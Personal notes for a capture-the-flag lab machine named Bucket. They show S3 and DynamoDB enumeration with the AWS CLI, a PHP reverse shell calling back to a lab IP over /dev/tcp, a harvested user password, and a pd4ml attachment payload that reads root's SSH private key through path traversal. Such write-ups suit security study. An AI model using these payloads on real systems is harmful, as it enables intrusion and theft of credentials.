# Main infos


IP: 10.10.10.212
bucket.htb
s3.bucket.htb

# S3

aws configure (used some example data from https://docs.aws.amazon.com/systems-manager/latest/userguide/getting-started-cli.html and https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-plan-region.html
AWS Access Key ID: `AKIAIOSFODNN7EXAMPLE` 
AWS Secret Access Key: `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`
Region: `us-west-2`
Export Format `json`


## list buckets
https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html

aws --endpoint-url http://s3.bucket.htb/ s3 ls
aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/images/
aws --endpoint-url http://s3.bucket.htb/ s3api get-object-acl --bucket adserver --key index.html

## send request without region or creds
aws --endpoint-url http://172.18.0.2:4566 s3 ls --region eu --no-sign-request


## create a bucket
aws --endpoint-url http://s3.bucket.htb/ s3 mb s3://mybucket

## copy file to bucket
aws --endpoint-url http://s3.bucket.htb/ s3 mb s3://mybucket
aws --endpoint-url http://s3.bucket.htb/ s3 cp test.txt s3://mybucket

## php reverse shell

```php
<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.169/9001 0>&1'");
echo "hello";?>
```


# Roy

## dynamodb
show tables
aws --endpoint-url http://s3.bucket.htb/ dynamodb list-tables
aws --endpoint-url http://s3.bucket.htb/ dynamodb scan --table-name users

## escalate to roy
su roy

Password: n2vM-<_K_Q:.Aa2




# way to root

Virtual Host Config
```
<VirtualHost 127.0.0.1:8000>
        <IfModule mpm_itk_module>
                AssignUserId root root
        </IfModule>
        DocumentRoot /var/www/bucket-app
</VirtualHost>
```


tunnel the app to localhost

``ssh roy@bucket.htb -L 8000:localhost:8000``

https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/GettingStarted.PHP.04.html

echo search criteria 

```php
<?php
$test = array('TableName' => 'alerts','FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")));

echo json_encode($test);

?>
```

output

```json
{
   "TableName":"alerts",
   "FilterExpression":"title = :title",
   "ExpressionAttributeValues":{
      ":title":{
         "S":"Ransomware"
      }
   }
}
```

## dynamo db

### create a table

``aws --endpoint-url http://s3.bucket.htb/ dynamodb create-table --table-name alerts \
--attribute-definitions \
AttributeName=title,AttributeType=S \
AttributeName=data,AttributeType=S \
--key-schema \
AttributeName=title,KeyType=HASH \
AttributeName=data,KeyType=RANGE \
--provisioned-throughput \
ReadCapacityUnits=10,WriteCapacityUnits=5``

### put item
``aws --endpoint-url http://s3.bucket.htb/ dynamodb put-item --table-name alerts --item file://item.json``

### item payload
``{
        "title": {"S": "Ransomware"},
        "data": {"S": "Payload"}
}``


### check if found
``aws --endpoint-url http://s3.bucket.htb/ dynamodb scan --table-name alerts --filter-expression "title = :title" --expression-attribute-values file://filter.json``


### final payload

``{
        "title": {"S": "Ransomware"},
        "data": {"S": "<pd4ml:attachment description=\"test\" src=\"../../../../../../../root/.ssh/id_rsa\"></pd4ml:attachment>"}
}``


![[Pasted image 20210225232055.png]]

### send web request

```plaintext
POST / HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

action=get_alerts
```

download result.pdf and get the root rsa key